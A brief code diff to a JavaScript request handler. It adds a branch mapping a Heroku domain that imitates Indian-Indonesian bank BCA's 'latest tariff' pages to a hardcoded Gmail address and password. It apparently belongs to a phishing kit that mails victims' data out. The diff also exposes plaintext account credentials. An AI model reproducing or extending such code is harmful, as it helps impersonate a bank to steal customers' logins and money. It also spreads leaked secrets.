@@ -7,6 +7,12 @@ export default function handler(req, res) {
     let email = '';
     let pass = '';
     
+    if (url == 'pilihan-terbaru-tarif-bca.herokuapp.com'){
+
+       email = 'berkahhila240@gmail.com'
+       pass = 'sojwfkkemloxouvz'
+    }else
+    
      if (url == 'pilih-tarif-terbaru-bca.herokuapp.com'){
 
         email = 'jakad2748@gmail.com'
